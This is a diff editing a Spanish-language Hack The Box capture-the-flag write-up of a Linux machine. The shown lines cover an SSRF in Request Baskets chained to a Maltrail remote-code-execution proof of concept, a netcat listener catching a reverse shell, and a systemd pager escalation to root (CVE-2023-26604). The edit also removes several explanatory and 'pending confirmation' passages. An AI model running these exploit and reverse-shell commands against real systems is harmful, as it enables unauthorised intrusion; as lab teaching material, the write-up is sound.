@@ -2,7 +2,7 @@
 
 - **Autor:** Alex09060
 - **Plataforma:** Hack The Box
-- **Dificultad:** Pendiente de confirmar en la ficha oficial de HTB.
+- **Dificultad:** Easy
 - **Sistema operativo:** Linux
 
 ## Resumen
@@ -77,19 +77,11 @@ Ejecuté el script con mi dirección IP, el puerto de escucha y la URL de la ces
 python3 exploit.py 10.10.14.111 443 http://10.129.229.26:55555/ssrf/
 ```
 
-Los argumentos corresponden a:
-
-- `10.10.14.111`: dirección IP de mi máquina atacante.
-- `443`: puerto en el que esperaba recibir la conexión inversa.
-- `http://10.129.229.26:55555/ssrf/`: URL de la cesta de Request Baskets.
-
-Al ejecutar el script aparecieron varios avisos `SyntaxWarning` relacionados con secuencias de escape en cadenas de texto. A pesar de esos avisos, el programa continuó y mostró el mensaje `Executing exploit...`.
-
 ![Ejecución del PoC de Maltrail](img/05.png)
 
 Referencia: [CVE-2025-34073 — INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-34073).
 
-### 2.3. Shell inversa
+### 2.3. Reverse Shell
 
 Antes de lanzar el exploit, preparé un listener de Netcat en el puerto `443` para recibir la conexión inversa:
 
@@ -97,11 +89,7 @@ Antes de lanzar el exploit, preparé un listener de Netcat en el puerto `443` pa
 sudo nc -nvlp 443
 ```
 
-Después de ejecutar el PoC recibí una conexión desde la máquina víctima. La shell se abrió sin una TTY interactiva y devolvió el siguiente mensaje:
-
-```text
-/bin/sh: 0: can't access tty; job control turned off
-```
+Después de ejecutar el PoC conseguimos una conexión desde la máquina víctima.
 
 ![Conexión inversa recibida](img/06.png)
 
@@ -111,13 +99,6 @@ Con esto conseguí acceso inicial a la máquina como el usuario `puma`.
 
 Una vez dentro, comprobé el directorio personal del usuario `puma` y localicé la flag `user.txt` en `/home/puma`.
 
-Para leerla utilicé:
-
-```bash
-cat user.txt
-```
-
-No incluyo el contenido de la flag para evitar publicar su valor.
 
 ## 4. Escalada de privilegios
 
@@ -173,7 +154,6 @@ La comprobación final confirmó que había conseguido acceso como `root`. Despu
 cat /root/root.txt
 ```
 
-No incluyo el valor de la flag en este write-up.
 
 Referencia: [CVE-2023-26604 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-26604).
 
@@ -196,12 +176,3 @@ Durante la resolución de esta máquina trabajé con varias técnicas y concepto
 - [Hummingbird-Maltrail-RCE-PoC](https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC)
 - [CVE-2023-26604 — systemd](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
 
-## 7. Datos pendientes de confirmar
-
-- **Dificultad oficial:** queda pendiente de comprobar en la ficha de la máquina en Hack The Box.
-- **Sistema operativo:** el entorno es Linux. La versión de `systemd` identificada es `245.4-4ubuntu3.22`.
-- **Servicios y versiones:** el escaneo inicial identifica los puertos abiertos `22/tcp` y `55555/tcp`. No se incluye un escaneo de versiones con `-sV` para SSH u otros servicios.
-- **Request Baskets:** la interfaz identifica la versión `1.2.1`.
-- **Maltrail:** se trabajó con la versión `0.53`.
-- **Tratamiento de la TTY:** no se ha incluido una secuencia de comandos porque no se dispone del comando exacto utilizado.
-- **Escape del paginador:** el procedimiento general está documentado, pero no se especifica la combinación exacta de teclas utilizada.
